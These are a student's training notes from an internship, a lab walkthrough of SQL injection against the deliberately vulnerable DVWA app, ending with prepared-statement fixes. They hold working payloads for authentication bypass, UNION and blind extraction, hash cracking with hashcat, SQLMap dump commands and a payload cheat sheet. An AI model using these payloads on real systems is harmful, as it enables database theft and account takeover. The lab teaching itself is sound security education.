# Day 12 — SQL Injection
### ApexPlanet Internship | Task 3: Web Application Security
**Timeline:** Days 25–36 | **Author:** Professorshubhx

---

## What is SQL Injection

SQL Injection is the number one web application vulnerability in the world — it has been on the OWASP Top 10 list since the list was created. It happens when a web application takes user input and passes it directly into a SQL query without properly sanitizing it first.

The result: an attacker can manipulate the SQL query, bypass authentication, extract the entire database, modify or delete data, and in some cases execute operating system commands.

It sounds complex but the core concept is simple — the application trusts user input it should never trust.

---

## How SQL Works — Quick Background

When you log into a website, the application typically runs a query like this:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'mypassword';
```

If the user exists and the password matches, login succeeds. The application builds this query by inserting whatever the user typed into a pre-written SQL template.

The problem is when that template is built by string concatenation — just gluing the user's input directly into the query — instead of using parameterized queries.

---

## The Injection

If the application builds the query like this in PHP:

```php
$query = "SELECT * FROM users WHERE username = '" . $username . "' AND password = '" . $password . "'";
```

An attacker can type this as the username:

```
admin'--
```

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything';
```

The `--` is a SQL comment. Everything after it is ignored. So the password check is completely bypassed. The attacker logs in as admin with no password.

---

## Types of SQL Injection

### In-Band SQLi — Results come back directly

**Error-Based:** The application shows database error messages that leak information about the structure.

**Union-Based:** Uses the UNION SQL keyword to append a second query and retrieve data from other tables.

### Blind SQLi — No direct output

**Boolean-Based:** Ask the database true/false questions and infer information from the application's behavior.

**Time-Based:** Use `SLEEP()` or `WAITFOR DELAY` to cause the database to pause — if the page loads slowly, the condition was true.

### Out-of-Band SQLi

Data is retrieved through a different channel — DNS requests, HTTP requests. Used when in-band methods don't work.

---

## 1. Practical — SQL Injection on DVWA

### Setup

```
Open Kali browser
Go to: http://192.168.56.104/dvwa
Login: admin / password
DVWA Security → Set to Low → Submit
Go to: SQL Injection (left menu)
```

### Basic Test — Is It Vulnerable?

In the User ID field, type:

```
'
```

Just a single quote. Submit it.

If you see a MySQL error like:

```
You have an error in your SQL syntax; check the manual that corresponds to
your MySQL server version for the right syntax to use near ''''' at line 1
```

The application is vulnerable. The single quote broke the SQL query — proof that your input is going directly into the query unfiltered.

### Extract Data — Basic UNION Attack

First find how many columns the query returns. Try these one by one until no error:

```
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
```

When you hit a number that causes an error, the previous number is the column count. For DVWA it's 2 columns.

Now use UNION to pull data:

```
1' UNION SELECT null, null--+
```

If that works (no error), replace nulls with actual data:

```
' UNION SELECT user(), database()--+
```

Expected output:

```
ID: ' UNION SELECT user(), database()--+
First name: root@localhost
Surname: dvwa
```

`user()` returned `root@localhost` — the database is running as root.
`database()` returned `dvwa` — that's the current database name.

### Extract All Tables

```
' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()--+
```

Output shows all tables in the dvwa database:
```
guestbook
users
```

### Extract Column Names from Users Table

```
' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--+
```

Output:
```
user_id
first_name
last_name
user
password
avatar
```

### Extract Usernames and Password Hashes

```
' UNION SELECT user, password FROM users--+
```

Output:
```
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
```

Those are MD5 hashes. Crack them:

```bash
# Using online tools: https://crackstation.net/
# Or using hashcat on Kali:
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Result: 5f4dcc3b5aa765d61d8327deb882cf99 = password
```

All DVWA user passwords extracted and cracked.

---

## 2. Authentication Bypass

Go to the DVWA login page. In the username field type:

```
admin'--
```

Password: anything (it doesn't matter)

The query becomes:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```

Password check is commented out. Login succeeds without knowing the password.

Other bypass payloads to try:

```sql
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
admin'--
' OR 'x'='x
```

---

## 3. Blind SQL Injection

Go to DVWA, set security to Medium. The field now rejects special characters in the URL. Use Burp Suite to intercept the request and modify the POST parameter directly.

### Boolean-Based Blind

```
1 AND 1=1    ← True condition — normal page loads
1 AND 1=2    ← False condition — different response or empty result
```

If the page behaves differently for these two inputs, it's vulnerable to blind SQLi.

Extract data character by character:

```sql
1 AND SUBSTRING(database(),1,1)='d'    ← Is first char of database name 'd'?
1 AND SUBSTRING(database(),2,1)='v'    ← Is second char 'v'?
```

This is tedious manually — use SQLMap to automate it.

### Time-Based Blind

```sql
1 AND SLEEP(5)--
```

If the page takes 5 seconds to load — the application is vulnerable and the database is MySQL.

```sql
1 AND IF(1=1, SLEEP(5), 0)--    ← Sleeps 5 sec (condition true)
1 AND IF(1=2, SLEEP(5), 0)--    ← No sleep (condition false)
```

---

## 4. SQLMap — Automated SQL Injection

SQLMap is a tool that automates detection and exploitation of SQL injection vulnerabilities. It's on Kali by default.

```bash
# Basic scan against DVWA SQL injection page
# First intercept the request in Burp Suite and save it as request.txt
sqlmap -r request.txt --dbs

# Or directly with URL and cookie
sqlmap -u "http://192.168.56.104/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=yoursessionid; security=low" \
  --dbs

# List databases
sqlmap -u "http://..." --cookie="..." --dbs

# List tables in dvwa database
sqlmap -u "http://..." --cookie="..." -D dvwa --tables

# Dump users table
sqlmap -u "http://..." --cookie="..." -D dvwa -T users --dump

# Crack hashes automatically while dumping
sqlmap -u "http://..." --cookie="..." -D dvwa -T users --dump --passwords
```

SQLMap will automatically detect the injection type, extract all data, and attempt to crack password hashes — what took us 10 manual steps above happens automatically.

**Important:** Only use SQLMap against systems you own or have explicit written permission to test.

---

## 5. Prevention — Prepared Statements

The fix for SQL injection is not filtering special characters — it's using **parameterized queries** (Prepared Statements). These separate SQL code from user data so they can never mix.

### Vulnerable Code (PHP — String Concatenation)

```php
// VULNERABLE — never do this
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);
```

### Fixed Code (PHP — Prepared Statement)

```php
// SECURE — parameterized query
$username = $_POST['username'];
$password = $_POST['password'];

$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

What happens now: even if the attacker types `admin'--`, it gets treated as a literal string — not as SQL code. The `?` placeholder is a data slot that can never become part of the SQL structure.

### Additional Defenses

```
Input validation      Reject input that doesn't match expected format
Least privilege       Database user should only have SELECT/INSERT — not DROP
WAF                   Web Application Firewall can filter common SQLi patterns
Error handling        Never show database errors to users — log them server-side
Stored procedures     Pre-compiled SQL — harder to inject into
```

---

## DVWA Security Levels — What Changes

```
Low      No protection at all — direct string concatenation
Medium   mysql_real_escape_string() — bypassed with UNION and blind techniques
High     Uses PDO with parameterized queries — not injectable via form
         (but cookie parameter still injectable on High)
```

Trying all three levels teaches you how each defense layer works and where it fails.

---

## Practice Tasks

1. Set DVWA to Low, go to SQL Injection — type `'` and confirm MySQL error appears
2. Use `' ORDER BY 1--+` through `' ORDER BY 3--+` to find column count
3. Run `' UNION SELECT user(), database()--+` — note the database user and name
4. Extract all table names using information_schema query
5. Extract all usernames and password hashes from the users table
6. Crack the hashes on https://crackstation.net/ — note all plaintext passwords
7. Go to DVWA login page — bypass authentication using `admin'--` as username
8. Set DVWA to Medium — intercept the request in Burp Suite, modify the id parameter to `1 AND SLEEP(5)--` — confirm time delay
9. Run SQLMap against the DVWA SQL injection page — use `--dump` to extract the users table automatically
10. Read the DVWA PHP source code for SQL Injection (click "View Source" button) — compare Low vs High implementations

---

## Quick Reference

```
BASIC PAYLOADS                  UNION ATTACK
'                               ' UNION SELECT null,null--+
' OR '1'='1                     ' UNION SELECT user(),database()--+
admin'--                        ' UNION SELECT table_name,null
' OR 1=1--                        FROM information_schema.tables--+

BLIND — BOOLEAN                 BLIND — TIME
1 AND 1=1                       1 AND SLEEP(5)--
1 AND 1=2                       1 AND IF(1=1,SLEEP(5),0)--
1 AND SUBSTRING(db,1,1)='d'

SQLMAP                          PREVENTION
--dbs          List databases   Prepared statements / parameterized queries
--tables       List tables      Input validation
--dump         Extract data     Least privilege DB user
-D -T          Specify target   Disable error messages to users
--passwords    Crack hashes     WAF
```

---

## Resources

- OWASP SQLi Guide: https://owasp.org/www-community/attacks/SQL_Injection
- SQLMap Documentation: https://sqlmap.org/
- PortSwigger SQL Injection Labs: https://portswigger.net/web-security/sql-injection
- CrackStation (hash cracking): https://crackstation.net/
- Defronix Academy | Mentor: Nitesh Singh Sir

---

## Connect

- **LinkedIn:** [Shubham Chaurasiya](https://www.linkedin.com/in/shubham-chaurasiya-60932a359/)
- **TryHackMe:** [professorshubhx](https://tryhackme.com/p/professorshubhx)

---

*Day 12 Complete | Next: Day 13 — Cross-Site Scripting (XSS) — Stored, Reflected, DOM-based, CSP mitigation*
